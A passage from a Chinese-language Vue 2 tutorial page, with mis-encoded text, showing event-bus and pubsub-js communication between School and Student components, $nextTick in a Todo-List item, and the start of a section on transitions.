class="hljs-number">5px</span>;&#125;</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br></code></pre></td></tr></table></figure><p>Student.vue</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;student&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>å­¦ç”Ÿå§“åï¼š&#123;&#123; name &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>å­¦ç”Ÿæ€§åˆ«ï¼š&#123;&#123; sex &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;sendStudentName&quot;</span>&gt;</span>æŠŠå­¦ç”Ÿåç»™Schoolç»„ä»¶<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span> //ğŸ”´<br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;</span><br><span class="language-javascript">    <span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;Student&#x27;</span>,</span><br><span class="language-javascript">    <span class="hljs-title function_">data</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">      <span class="hljs-keyword">return</span> &#123;</span><br><span class="language-javascript">        <span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;å¼ ä¸‰&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">sex</span>:<span class="hljs-string">&#x27;ç”·&#x27;</span></span><br><span class="language-javascript">      &#125;</span><br><span class="language-javascript">    &#125;,</span><br><span class="language-javascript">    <span class="hljs-attr">methods</span>: &#123;  <span class="hljs-comment">//ğŸ”´</span></span><br><span class="language-javascript">      <span class="hljs-title function_">sendStudentName</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">        <span class="hljs-variable language_">this</span>.<span class="hljs-property">$bus</span>.$emit(<span class="hljs-string">&#x27;demo&#x27;</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>)</span><br><span class="language-javascript">      &#125;</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">  &#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="language-css"><span class="hljs-selector-class">.student</span>&#123;<span class="hljs-attribute">background-color</span>: pink;<span class="hljs-attribute">padding</span>: <span class="hljs-number">5px</span>;<span class="hljs-attribute">margin-top</span>: <span class="hljs-number">30px</span>;&#125;</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br></code></pre></td></tr></table></figure><p>â€‹    </p><p>![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](<a href="https://img-blog.csdnimg.cn/86238df578224c798ab772db2798b85c.png?x-oss-">https://img-blog.csdnimg.cn/86238df578224c798ab772db2798b85c.png?x-oss-</a><br>process&#x3D;image&#x2F;watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qC86Zu354uQ5oCd,size_20,color_FFFFFF,t_70,g_se,x_16)</p><p>![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](<a href="https://img-blog.csdnimg.cn/5aeffb62c4f3462ea9b5fb7b98a1b0da.png?x-oss-">https://img-blog.csdnimg.cn/5aeffb62c4f3462ea9b5fb7b98a1b0da.png?x-oss-</a><br>process&#x3D;image&#x2F;watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qC86Zu354uQ5oCd,size_20,color_FFFFFF,t_70,g_se,x_16)</p><h2 id="2-6-æ¶ˆæ¯è®¢é˜…ä¸å‘å¸ƒ-åŸºæœ¬ä¸ç”¨"><a href="#2-6-æ¶ˆæ¯è®¢é˜…ä¸å‘å¸ƒ-åŸºæœ¬ä¸ç”¨" class="headerlink" title="2.6 æ¶ˆæ¯è®¢é˜…ä¸å‘å¸ƒ(åŸºæœ¬ä¸ç”¨)"></a>2.6 æ¶ˆæ¯è®¢é˜…ä¸å‘å¸ƒ(åŸºæœ¬ä¸ç”¨)</h2><ol><li><p>ä¸€ç§ç»„ä»¶é—´é€šä¿¡çš„æ–¹å¼ï¼Œé€‚ç”¨äºä»»æ„ç»„ä»¶é—´é€šä¿¡ã€‚</p></li><li><p>ä½¿ç”¨æ­¥éª¤ï¼š</p><ol><li><p>å®‰è£…pubsubï¼š<code>npm i pubsub-js</code></p></li><li><p>å¼•å…¥: <code>import pubsub from &#39;pubsub-js&#39;</code></p></li><li><p>æ¥æ”¶æ•°æ®ï¼šAç»„ä»¶æƒ³æ¥æ”¶æ•°æ®ï¼Œåˆ™åœ¨Aç»„ä»¶ä¸­è®¢é˜…æ¶ˆæ¯ï¼Œè®¢é˜…çš„å›è°ƒç•™åœ¨Aç»„ä»¶è‡ªèº«ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;<br>    <span class="hljs-attr">methods</span>: &#123;<br>        <span class="hljs-title function_">demo</span>(<span class="hljs-params">msgName, data</span>) &#123;...&#125;<br>    &#125;<br>    ...<br>    <span class="hljs-title function_">mounted</span>(<span class="hljs-params"></span>) &#123;<br><span class="hljs-variable language_">this</span>.<span class="hljs-property">pid</span> = pubsub.<span class="hljs-title function_">subscribe</span>(<span class="hljs-string">&#x27;xxx&#x27;</span>,<span class="hljs-variable language_">this</span>.<span class="hljs-property">demo</span>)<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>æä¾›æ•°æ®ï¼špubsub.publish(â€˜xxxâ€™,data) </p></li><li><p>æœ€å¥½åœ¨beforeDestroyé’©å­ä¸­ï¼Œä½¿ç”¨pubsub.unsubscribe(pid)å–æ¶ˆè®¢é˜…</p></li></ol></li></ol><blockquote><p>ç¤ºä¾‹ä»£ç </p></blockquote><p>è®¢é˜…æ¶ˆæ¯</p><p><strong>School.vue</strong></p> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;school&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>å­¦æ ¡åç§°ï¼š&#123;&#123;name&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>å­¦æ ¡åœ°å€ï¼š&#123;&#123;address&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">import</span> pubsub <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;pubsub-js&#x27;</span></span><br><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;</span><br><span class="language-javascript"><span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;School&#x27;</span>,</span><br><span class="language-javascript"><span class="hljs-title function_">data</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript"><span class="hljs-keyword">return</span> &#123;</span><br><span class="language-javascript"><span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;å°šç¡…è°·&#x27;</span>,</span><br><span class="language-javascript"><span class="hljs-attr">address</span>:<span class="hljs-string">&#x27;åŒ—äº¬&#x27;</span>,</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript">&#125;,</span><br><span class="language-javascript"><span class="hljs-attr">methods</span>: &#123;</span><br><span class="language-javascript"><span class="hljs-title function_">demo</span>(<span class="hljs-params">msgName, data</span>) &#123;</span><br><span class="language-javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;æˆ‘æ˜¯Schoolç»„ä»¶ï¼Œæ”¶åˆ°äº†æ•°æ®ï¼š&#x27;</span>,msgName, data)</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript">&#125;,</span><br><span class="language-javascript"><span class="hljs-title function_">mounted</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript"><span class="hljs-variable language_">this</span>.<span class="hljs-property">pubId</span> = pubsub.<span class="hljs-title function_">subscribe</span>(<span class="hljs-string">&#x27;demo&#x27;</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">demo</span>) <span class="hljs-comment">// è®¢é˜…æ¶ˆæ¯</span></span><br><span class="language-javascript">&#125;,</span><br><span class="language-javascript"><span class="hljs-title function_">beforeDestroy</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">pubsub.<span class="hljs-title function_">unsubscribe</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">pubId</span>) <span class="hljs-comment">// å–æ¶ˆè®¢é˜…</span></span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="language-css"></span><br><span class="language-css"><span class="hljs-selector-class">.school</span>&#123;</span><br><span class="language-css"><span class="hljs-attribute">background-color</span>: skyblue;</span><br><span class="language-css"><span class="hljs-attribute">padding</span>: <span class="hljs-number">5px</span>;</span><br><span class="language-css">&#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>Student.vue</strong></p> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;student&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>å­¦ç”Ÿå§“åï¼š&#123;&#123;name&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>å­¦ç”Ÿæ€§åˆ«ï¼š&#123;&#123;sex&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;sendStudentName&quot;</span>&gt;</span>æŠŠå­¦ç”Ÿåç»™Schoolç»„ä»¶<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-keyword">import</span> pubsub <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;pubsub-js&#x27;</span></span><br><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;</span><br><span class="language-javascript">    <span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;Student&#x27;</span>,</span><br><span class="language-javascript">    <span class="hljs-title function_">data</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">      <span class="hljs-keyword">return</span> &#123;</span><br><span class="language-javascript">        <span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;JOJO&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">sex</span>:<span class="hljs-string">&#x27;ç”·&#x27;</span>,</span><br><span class="language-javascript">      &#125;</span><br><span class="language-javascript">    &#125;,</span><br><span class="language-javascript">    <span class="hljs-attr">methods</span>: &#123;</span><br><span class="language-javascript">      <span class="hljs-title function_">sendStudentName</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">        pubsub.<span class="hljs-title function_">publish</span>(<span class="hljs-string">&#x27;demo&#x27;</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>) <span class="hljs-comment">// å‘å¸ƒæ¶ˆæ¯</span></span><br><span class="language-javascript">      &#125;</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">  &#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="language-css"></span><br><span class="language-css">  <span class="hljs-selector-class">.student</span>&#123;</span><br><span class="language-css">    <span class="hljs-attribute">background-color</span>: pink;</span><br><span class="language-css">    <span class="hljs-attribute">padding</span>: <span class="hljs-number">5px</span>;</span><br><span class="language-css">    <span class="hljs-attribute">margin-top</span>: <span class="hljs-number">30px</span>;</span><br><span class="language-css">  &#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br></code></pre></td></tr></table></figure><p>â€‹    </p><h2 id="2-7-nextTick"><a href="#2-7-nextTick" class="headerlink" title="2.7 nextTick"></a>2.7 nextTick</h2><pre><code class="hljs">1. è¯­æ³•ï¼š`this.$nextTick(å›è°ƒå‡½æ•°)`2. ä½œç”¨ï¼šåœ¨ä¸‹ä¸€æ¬¡ DOM æ›´æ–°ç»“æŸåæ‰§è¡Œå…¶æŒ‡å®šçš„å›è°ƒã€‚3. ä»€ä¹ˆæ—¶å€™ç”¨ï¼šå½“æ”¹å˜æ•°æ®åï¼Œè¦åŸºäºæ›´æ–°åçš„æ–°DOMè¿›è¡ŒæŸäº›æ“ä½œæ—¶ï¼Œè¦åœ¨nextTickæ‰€æŒ‡å®šçš„å›è°ƒå‡½æ•°ä¸­æ‰§è¡Œã€‚</code></pre><p>ä½¿ç”¨ $nextTick ä¼˜åŒ– Todo-List<br>src&#x2F;components&#x2F;MyItem.vue</p>  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">:checked</span>=<span class="hljs-string">&quot;todo.done&quot;</span> @<span class="hljs-attr">change</span>=<span class="hljs-string">&quot;changeObjDone&quot;</span> /&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">v-show</span>=<span class="hljs-string">&quot;!todo.isEdit&quot;</span>&gt;</span>&#123;&#123; todo.title &#125;&#125; <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">v-show</span>=<span class="hljs-string">&quot;todo.isEdit&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;todo.title&quot;</span> @<span class="hljs-attr">blur</span>=<span class="hljs-string">&quot;handleBlur&quot;</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;inputTitle&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-danger&quot;</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;deleteTodoObj&quot;</span>&gt;</span>åˆ é™¤<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-edit&quot;</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;editTodoObj&quot;</span>&gt;</span>ç¼–è¾‘<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;</span><br><span class="language-javascript">        <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;MyItem&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-title function_">data</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">return</span> &#123;</span><br><span class="language-javascript">                <span class="hljs-attr">todo</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">p_todo</span></span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;,</span><br><span class="language-javascript">        <span class="hljs-attr">props</span>: [<span class="hljs-string">&quot;p_todo&quot;</span>],</span><br><span class="language-javascript">        <span class="hljs-attr">methods</span>: &#123;</span><br><span class="language-javascript">            <span class="hljs-title function_">changeObjDone</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">todo</span>.<span class="hljs-property">id</span>)</span><br><span class="language-javascript">                <span class="hljs-variable language_">this</span>.<span class="hljs-property">$bus</span>.$emit(<span class="hljs-string">&#x27;changeObjDone&#x27;</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">todo</span>.<span class="hljs-property">id</span>)</span><br><span class="language-javascript">            &#125;,</span><br><span class="language-javascript">            <span class="hljs-title function_">deleteTodoObj</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">                <span class="hljs-keyword">if</span> (<span class="hljs-title function_">confirm</span>(<span class="hljs-string">&#x27;ç¡®å®šåˆ é™¤å—ï¼Ÿ&#x27;</span>)) &#123;</span><br><span class="language-javascript">                    <span class="hljs-variable language_">this</span>.<span class="hljs-property">$bus</span>.$emit(<span class="hljs-string">&#x27;deleteTodoObj&#x27;</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">todo</span>.<span class="hljs-property">id</span>)</span><br><span class="language-javascript">                &#125;</span><br><span class="language-javascript">            &#125;,</span><br><span class="language-javascript">            <span class="hljs-comment">//å¼€å§‹ç¼–è¾‘</span></span><br><span class="language-javascript">            <span class="hljs-title function_">editTodoObj</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">                <span class="hljs-variable language_">this</span>.<span class="hljs-property">todo</span>.<span class="hljs-property">isEdit</span> = !<span class="hljs-variable language_">this</span>.<span class="hljs-property">todo</span>.<span class="hljs-property">isEdit</span></span><br><span class="language-javascript">                <span class="hljs-variable language_">this</span>.$nextTick(<span class="hljs-function">() =&gt;</span> &#123;</span><br><span class="language-javascript">                    <span class="hljs-variable language_">this</span>.<span class="hljs-property">$refs</span>.<span class="hljs-property">inputTitle</span>.<span class="hljs-title function_">focus</span>()</span><br><span class="language-javascript">                &#125;)</span><br><span class="language-javascript">            &#125;,</span><br><span class="language-javascript">            <span class="hljs-comment">// å¤±å»ç„¦ç‚¹</span></span><br><span class="language-javascript">            <span class="hljs-title function_">handleBlur</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">                <span class="hljs-variable language_">this</span>.<span class="hljs-property">todo</span>.<span class="hljs-property">isEdit</span> = !<span class="hljs-variable language_">this</span>.<span class="hljs-property">todo</span>.<span class="hljs-property">isEdit</span></span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="language-css"></span><br><span class="language-css">    <span class="hljs-comment">/*item*/</span></span><br><span class="language-css">    <span class="hljs-selector-tag">li</span> &#123;</span><br><span class="language-css">        <span class="hljs-attribute">list-style</span>: none;</span><br><span class="language-css">        <span class="hljs-attribute">height</span>: <span class="hljs-number">36px</span>;</span><br><span class="language-css">        <span class="hljs-attribute">line-height</span>: <span class="hljs-number">36px</span>;</span><br><span class="language-css">        <span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span> <span class="hljs-number">5px</span>;</span><br><span class="language-css">        <span class="hljs-attribute">border-bottom</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#ddd</span>;</span><br><span class="language-css">    &#125;</span><br><span class="language-css"></span><br><span class="language-css">    <span class="hljs-selector-tag">li</span> <span class="hljs-selector-tag">label</span> &#123;</span><br><span class="language-css">        <span class="hljs-attribute">float</span>: left;</span><br><span class="language-css">        <span class="hljs-attribute">cursor</span>: pointer;</span><br><span class="language-css">    &#125;</span><br><span class="language-css"></span><br><span class="language-css">    <span class="hljs-selector-tag">li</span> <span class="hljs-selector-tag">label</span> <span class="hljs-selector-tag">li</span> <span class="hljs-selector-tag">input</span> &#123;</span><br><span class="language-css">        <span class="hljs-attribute">vertical-align</span>: middle;</span><br><span class="language-css">        <span class="hljs-attribute">margin-right</span>: <span class="hljs-number">6px</span>;</span><br><span class="language-css">        <span class="hljs-attribute">position</span>: relative;</span><br><span class="language-css">        <span class="hljs-attribute">top</span>: -<span class="hljs-number">1px</span>;</span><br><span class="language-css">    &#125;</span><br><span class="language-css"></span><br><span class="language-css">    <span class="hljs-selector-tag">li</span> <span class="hljs-selector-tag">button</span> &#123;</span><br><span class="language-css">        <span class="hljs-attribute">float</span>: right;</span><br><span class="language-css">        <span class="hljs-attribute">display</span>: none;</span><br><span class="language-css">        <span class="hljs-attribute">margin-top</span>: <span class="hljs-number">3px</span>;</span><br><span class="language-css">    &#125;</span><br><span class="language-css"></span><br><span class="language-css">    <span class="hljs-selector-tag">li</span><span class="hljs-selector-pseudo">:before</span> &#123;</span><br><span class="language-css">        <span class="hljs-attribute">content</span>: initial;</span><br><span class="language-css">    &#125;</span><br><span class="language-css"></span><br><span class="language-css">    <span class="hljs-selector-tag">li</span><span class="hljs-selector-pseudo">:last-child</span> &#123;</span><br><span class="language-css">        <span class="hljs-attribute">border-bottom</span>: none;</span><br><span class="language-css">    &#125;</span><br><span class="language-css"></span><br><span class="language-css">    <span class="hljs-selector-tag">li</span><span class="hljs-selector-pseudo">:hover</span> &#123;</span><br><span class="language-css">        <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#ddd</span>;</span><br><span class="language-css">    &#125;</span><br><span class="language-css"></span><br><span class="language-css">    <span class="hljs-selector-tag">li</span><span class="hljs-selector-pseudo">:hover</span> <span class="hljs-selector-tag">button</span> &#123;</span><br><span class="language-css">        <span class="hljs-attribute">display</span>: block;</span><br><span class="language-css">    &#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>&gt;<br></code></pre></td></tr></table></figure><h2 id="2-8-Vueå°è£…çš„è¿‡åº¦ä¸åŠ¨ç”»"><a href="#2-8-Vueå°è£…çš„è¿‡åº¦ä¸åŠ¨ç”»" class="headerlink" title="2.8 Vueå°è£…çš„è¿‡åº¦ä¸åŠ¨ç”»"></a>2.8 Vueå°è£…çš„è¿‡åº¦ä¸åŠ¨ç”»</h2><pre><code class="hljs">1. ä½œç”¨ï¼šåœ¨æ’å…¥ã€æ›´æ–°æˆ–ç§»é™¤ DOMå…ƒç´ æ—¶ï¼Œåœ¨åˆé€‚çš„æ—¶å€™ç»™å…ƒç´ æ·»åŠ æ ·å¼ç±»åã€‚2. å›¾ç¤ºï¼š </code></pre><p>  <img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124154948347.png" alt="image-20221124154948347"></p><ol start="3"><li><p>å†™æ³•ï¼š</p><ol><li>å‡†å¤‡å¥½æ ·å¼ï¼š</li></ol><ul><li>å…ƒç´ 